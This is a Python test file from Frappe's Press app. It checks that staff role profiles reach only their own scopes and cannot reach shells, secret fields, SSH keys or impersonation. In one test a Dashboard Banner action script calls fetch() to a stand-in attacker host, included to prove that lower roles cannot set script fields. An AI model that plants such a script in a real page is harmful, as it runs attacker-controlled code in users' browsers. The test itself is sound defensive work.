# Copyright (c) 2026, Frappe and Contributors
# See license.txt

from unittest.mock import patch

import frappe
from frappe.tests.utils import FrappeTestCase

from press.press.doctype.site.test_site import create_test_site
from press.press.doctype.team.team import Team
from press.press.doctype.team.test_team import create_test_press_admin_team, create_test_team
from press.press.doctype.team_deletion_request.team_deletion_request import TeamDeletionRequest

SCOPE_ROLES = {
	"Press Support L1",
	"Press Support Engineer",
	"Press Infrastructure Manager",
	"Press Release Manager",
	"Press Billing Manager",
	"Press Security Manager",
	"Press Product Manager",
	"Press SSH Manager",
	"Press Marketplace Manager",
	"Partner Manager",
}

# A scope role that opens a shell, under the consent rules in press/access
SHELL_ROLES = {
	"Press Infrastructure Manager": {"Ansible Console", "Ansible Console Log", "Serial Console Log"},
	"Press Support Engineer": {"Bench Shell", "Bench Shell Log"},
}

# Reaches only self-hosted servers. No Role Profile includes it.
HYBRID_ROLE = "Press Hybrid Server Manager"

SYSTEM_MANAGER_ONLY = {
	"Build Cache Shell",
	"Certificate Authority",
	"Mail Setup",
	"Mpesa Setup",
	"Payment Gateway",
	"Press Settings",
	"Saas Remote Login",
	"Site Access Token",
	"SSH Certificate Authority",
	"Telegram Group",
}

SECURITY_READ_ONLY = {
	"Audit Log",
	"Cookie Preference Log",
	"MariaDB Audit Log",
	"Site User Session",
	"SQL Playground Log",
	"User 2FA",
}

SCOPE_READ_ONLY = {
	"Agent Job": "sends any request to a server agent",
	"App Rename": "holds scripts that site updates run on benches",
	"Press Job Type": "holds step scripts that PressJobStep.execute runs",
	"Press Workflow": "names the method that its run calls",
	"Press Workflow Object": "holds pickled values that tasks load",
	"Press Workflow Task": "names the method and arguments that its run calls",
	"Press Workflow Test": "runs workflow engine test code",
}

SUPPORT_READ_ONLY = [
	"Invoice",
	"Subscription",
	"Marketplace App",
	"Product Trial",
	"Partner Lead",
	"Agent Job",
]

SUPPORT_CREATES = {"TLS Certificate": True, "Server Activity": True, "Press Notification": True}
SUPPORT_CREATES |= {"Site Plan Change": False, "Plan Change": False, "Agent Job": False, "Press Job": False}

SECRET_METHODS = [
	("Server", "show_agent_password"),
	("Site", "show_admin_password"),
]

SECRET_FIELDS = {
	"Agent Job": ["request_data", "request_files"],
	"Ansible Play": ["variables"],
	"Marketplace App Subscription": ["secret_key"],
	"Saas App Subscription": ["secret_key"],
}

SCRIPT_FIELDS = {
	"Dashboard Banner": ["action_script"],
	"Product Trial": ["suspension_email_content", "email_header_content", "email_account"],
}

SSH_DOCTYPES = {"SSH Access Audit", "SSH Certificate", "SSH Key", "User SSH Certificate", "User SSH Key"}

SUPPORT_READS = [
	"Site",
	"Team",
	"Release Group",
	"Server",
	"Agent Job",
	"Invoice",
	"Marketplace App",
	"Partner Lead",
]
SUPPORT_DENIED = ["Payout Order", "Audit Log", "Wazuh Vulnerability", "SSH Certificate", "Cluster"]

PROFILE_SCOPES = {
	"Press Support L1": (SUPPORT_READS, SUPPORT_DENIED),
	"Press Support Engineer": (SUPPORT_READS, SUPPORT_DENIED),
	"Press Site Reliability Engineer": (
		["Server", "Agent Job", "Site", "Bench"],
		["Payout Order", "Audit Log"],
	),
	"Press Security Engineer": (["Wazuh Vulnerability", "Audit Log", "Server"], ["Site", "SSH Certificate"]),
	"Press SSH Access Manager": (sorted(SSH_DOCTYPES), ["Server", "Site", "Audit Log"]),
	"Press Finance": (["Invoice", "Site Plan", "Payout Order"], ["Site", "Server", "Team"]),
	"Press Product Team": (["Product Trial", "Saas App", "Dashboard Banner"], ["Site", "Invoice"]),
	"Press Marketplace Team": (["Marketplace App", "App Release Approval Request"], ["Server", "Invoice"]),
	"Press Partnerships": (["Partner Lead", "Partner Tier", "ERPNext Consultant"], ["Site", "Invoice"]),
}


def create_staff_user(*role_profiles: str) -> str:
	user = frappe.new_doc("User")
	user.update({"email": frappe.mock("email"), "first_name": "Staff", "send_welcome_email": 0})
	for role_profile in role_profiles:
		user.append("role_profiles", {"role_profile": role_profile})
	user.insert(ignore_permissions=True)
	return str(user.name)


def press_doctype_roles() -> dict[str, set[str]]:
	modules = frappe.get_all("Module Def", {"app_name": "press"}, pluck="name")
	doctypes = frappe.get_all("DocType", {"module": ("in", modules), "istable": 0, "custom": 0}, pluck="name")
	roles: dict[str, set[str]] = {doctype: set() for doctype in doctypes}
	for permission in frappe.get_all("DocPerm", {"parent": ("in", doctypes)}, ["parent", "role"]):
		roles[permission.parent].add(permission.role)
	return roles


class TestStaffRoleScopes(FrappeTestCase):
	"""Staff reach each scope through a scope role, not through System Manager."""

	def tearDown(self):
		frappe.set_user("Administrator")
		frappe.db.rollback()

	def test_every_press_doctype_open_to_system_manager_also_grants_a_scope_role(self):
		missing = [
			doctype
			for doctype, roles in press_doctype_roles().items()
			if "System Manager" in roles and doctype not in SYSTEM_MANAGER_ONLY and not roles & SCOPE_ROLES
		]
		self.assertEqual(
			missing, [], "Add a scope role to these DocTypes, or list them as System Manager only"
		)

	def test_shell_and_secret_doctypes_grant_no_scope_role(self):
		roles = press_doctype_roles()
		leaked = {doctype: roles[doctype] & SCOPE_ROLES for doctype in SYSTEM_MANAGER_ONLY}
		self.assertEqual({doctype: found for doctype, found in leaked.items() if found}, {})

	def test_shell_doctypes_grant_only_their_own_scope_role(self):
		roles = press_doctype_roles()
		for role, doctypes in SHELL_ROLES.items():
			for doctype in doctypes:
				with self.subTest(doctype=doctype):
					self.assertEqual(roles[doctype], {"System Manager", role})

	def test_hybrid_role_grants_only_its_own_ssh_doctypes(self):
		granted = set(frappe.get_all("DocPerm", {"role": HYBRID_ROLE}, pluck="parent"))
		self.assertEqual(granted, {"User SSH Certificate", "User SSH Key"})

	def test_no_role_profile_includes_the_hybrid_role(self):
		profiles = frappe.get_all(
			"Has Role", {"parenttype": "Role Profile", "role": HYBRID_ROLE}, pluck="parent"
		)
		self.assertEqual(profiles, [])

	def test_employee_profile_gives_the_base_roles_of_every_employee(self):
		roles = frappe.get_all(
			"Has Role", {"parenttype": "Role Profile", "parent": "Press Employee"}, pluck="role"
		)
		self.assertEqual(set(roles), {"Press Employee", "Press User"})

	def test_saving_an_employee_keeps_the_base_roles_next_to_a_job_profile(self):
		user = frappe.get_doc("User", create_staff_user("Press Employee", "Press Support Engineer"))
		user.save(ignore_permissions=True)
		self.assertTrue(
			{"Press Employee", "Press User", "Press Support Engineer"} <= set(frappe.get_roles(user.name))
		)

	def test_employee_role_only_requests_support_access(self):
		granted = set(frappe.get_all("DocPerm", {"role": "Press Employee"}, pluck="parent"))
		self.assertEqual(granted, {"Support Access"})

	@patch("frappe.sendmail")
	def test_employee_role_requests_access_to_a_site_that_it_cannot_read(self, _sendmail):
		site = create_test_site(team=create_test_press_admin_team().name)
		agent_team = create_test_press_admin_team()
		agent = str(agent_team.user)
		frappe.get_doc("User", agent).add_roles("Press Employee")  # type: ignore[attr-defined]
		frappe.set_user(agent)
		self.assertFalse(frappe.has_permission("Site", "read", site.name))
		access = frappe.get_doc(
			{
				"doctype": "Support Access",
				"requested_team": agent_team.name,
				"reason": "Customer asked for help",
				"resources": [{"document_type": "Site", "document_name": site.name}],
			}
		).insert()
		self.assertEqual(access.get("requested_by"), agent)

	def test_role_profile_reads_its_own_scope_and_not_other_scopes(self):
		for profile, (allowed, denied) in PROFILE_SCOPES.items():
			user = create_staff_user(profile)
			with self.subTest(profile=profile):
				self.assertEqual(frappe.db.get_value("User", user, "user_type"), "System User")
				for doctype in allowed:
					self.assertTrue(
						frappe.has_permission(doctype, "read", user=user), f"{profile} reads {doctype}"
					)
				for doctype in denied:
					self.assertFalse(
						frappe.has_permission(doctype, "read", user=user), f"{profile} reads {doctype}"
					)

	def test_no_role_profile_reads_shell_or_secret_doctypes(self):
		user = create_staff_user(*PROFILE_SCOPES)
		readable = [
			doctype for doctype in SYSTEM_MANAGER_ONLY if frappe.has_permission(doctype, "read", user=user)
		]
		self.assertEqual(readable, [])

	def test_scope_roles_only_read_doctypes_that_run_requests_or_scripts(self):
		ptypes = ("write", "create", "delete", "submit", "cancel", "amend")
		for doctype in SCOPE_READ_ONLY:
			for permission in frappe.get_all(
				"DocPerm", {"parent": doctype, "role": ("in", SCOPE_ROLES)}, ["*"]
			):
				with self.subTest(doctype=doctype, role=permission.role):
					self.assertEqual([ptype for ptype in ptypes if permission[ptype]], [])

	def test_infrastructure_manager_cannot_insert_an_agent_job(self):
		frappe.set_user(create_staff_user("Press Site Reliability Engineer"))
		self.assertTrue(frappe.has_permission("Agent Job", "read"))
		job = frappe.get_doc({"doctype": "Agent Job", "request_path": "ping", "request_method": "GET"})
		with self.assertRaises(frappe.PermissionError):
			job.insert()

	def test_product_manager_cannot_set_the_dashboard_banner_action_script(self):
		frappe.set_user(create_staff_user("Press Product Team"))
		banner = frappe.get_doc(
			{
				"doctype": "Dashboard Banner",
				"title": "Maintenance",
				"is_global": 1,
				"has_action": 1,
				"action_label": "Open",
				"action_script": "function onClickAction() { fetch('https://attacker.example') }",
			}
		).insert()
		default_script = getattr(
			frappe.get_meta("Dashboard Banner").get_field("action_script"), "default", None
		)
		self.assertEqual(banner.get("action_script"), default_script)

	def test_only_ssh_and_infrastructure_profiles_can_create_ssh_certificates_and_keys(self):
		own_only = {"Press Site Reliability Engineer", "Press Security Engineer"}
		for profile in PROFILE_SCOPES:
			user = create_staff_user(profile)
			with self.subTest(profile=profile):
				for doctype in SSH_DOCTYPES:
					can_create = frappe.has_permission(doctype, "create", user=user)
					expected = profile == "Press SSH Access Manager" or (
						profile in own_only and doctype in {"User SSH Certificate", "User SSH Key"}
					)
					self.assertEqual(can_create, expected, doctype)

	def test_security_manager_cannot_change_audit_logs_or_2fa(self):
		user = create_staff_user("Press Security Engineer")
		for doctype in SECURITY_READ_ONLY:
			with self.subTest(doctype=doctype):
				self.assertTrue(frappe.has_permission(doctype, "read", user=user))
				for ptype in ("write", "create", "delete"):
					self.assertFalse(frappe.has_permission(doctype, ptype, user=user), ptype)

	def test_support_reads_billing_and_other_scopes_but_cannot_change_them(self):
		user = create_staff_user("Press Support Engineer")
		for doctype in SUPPORT_READ_ONLY:
			with self.subTest(doctype=doctype):
				self.assertTrue(frappe.has_permission(doctype, "read", user=user))
				for ptype in ("write", "create", "delete"):
					self.assertFalse(frappe.has_permission(doctype, ptype, user=user), ptype)

	def test_support_creates_only_the_safe_side_effect_records(self):
		user = create_staff_user("Press Support Engineer")
		for doctype, can_create in SUPPORT_CREATES.items():
			with self.subTest(doctype=doctype):
				self.assertEqual(frappe.has_permission(doctype, "create", user=user), can_create)
		self.assertTrue(frappe.has_permission("Server", "write", user=user))
		self.assertFalse(frappe.has_permission("Server", "create", user=user))

	def test_scope_roles_cannot_call_methods_that_return_secrets(self):
		frappe.set_user(create_staff_user(*PROFILE_SCOPES))
		for doctype, method in SECRET_METHODS:
			controller = frappe.get_doc({"doctype": doctype})
			with (
				self.subTest(method=method),
				patch.dict(frappe.local.flags, {"in_test": False}),
				self.assertRaises(frappe.PermissionError),
			):
				getattr(controller, method)()

	def test_scope_roles_cannot_read_fields_that_hold_secrets(self):
		for doctype, fieldnames in SECRET_FIELDS.items():
			meta = frappe.get_meta(doctype)
			with self.subTest(doctype=doctype):
				self.assertEqual(
					{getattr(meta.get_field(fieldname), "permlevel", None) for fieldname in fieldnames}, {1}
				)
				readers = frappe.get_all(
					"DocPerm", {"parent": doctype, "permlevel": 1, "read": 1}, pluck="role"
				)
				self.assertIn("System Manager", readers)
				leaked = set(readers) & {
					"Press Support L1",
					"Press Support Engineer",
					"Press Infrastructure Manager",
				}
				self.assertEqual(leaked, set())

	def test_only_system_managers_reach_fields_that_run_as_a_script_or_template(self):
		for doctype, fieldnames in SCRIPT_FIELDS.items():
			meta = frappe.get_meta(doctype)
			with self.subTest(doctype=doctype):
				self.assertEqual(
					{getattr(meta.get_field(fieldname), "permlevel", None) for fieldname in fieldnames}, {1}
				)
				roles = frappe.get_all("DocPerm", {"parent": doctype, "permlevel": 1}, pluck="role")
				self.assertEqual(set(roles), {"System Manager"})

	def test_support_manager_cannot_impersonate_a_team_member(self):
		team = create_test_team()
		team.append("team_members", {"user": team.user})
		team.save()
		member = team.team_members[-1].name
		frappe.set_user(create_staff_user("Press Support Engineer"))
		with patch.dict(frappe.local.flags, {"in_test": False}), self.assertRaises(frappe.PermissionError):
			Team("Team", team.name).impersonate(member, "Debugging")
		self.assertFalse(frappe.db.exists("Team Member Impersonation", {"team": team.name}))

	def test_support_manager_cannot_add_themselves_to_a_customer_team(self):
		team = create_test_team()
		support_user = create_staff_user("Press Support Engineer")
		frappe.set_user(support_user)
		team = Team("Team", team.name)
		team.append("team_members", {"user": support_user})
		with self.assertRaisesRegex(frappe.PermissionError, "Only team owner or admins can make changes"):
			team.save()

	def test_support_can_request_deletion_of_a_team_they_do_not_own(self):
		request = TeamDeletionRequest({"doctype": "Team Deletion Request", "team": create_test_team().name})
		for profile in ("Press Support L1", "Press Support Engineer"):
			frappe.set_user(create_staff_user(profile))
			request.validate_team_owner()

	def test_billing_manager_cannot_request_deletion_of_a_team_they_do_not_own(self):
		request = TeamDeletionRequest({"doctype": "Team Deletion Request", "team": create_test_team().name})
		frappe.set_user(create_staff_user("Press Finance"))
		with self.assertRaisesRegex(frappe.PermissionError, "You need to be a Team owner"):
			request.validate_team_owner()
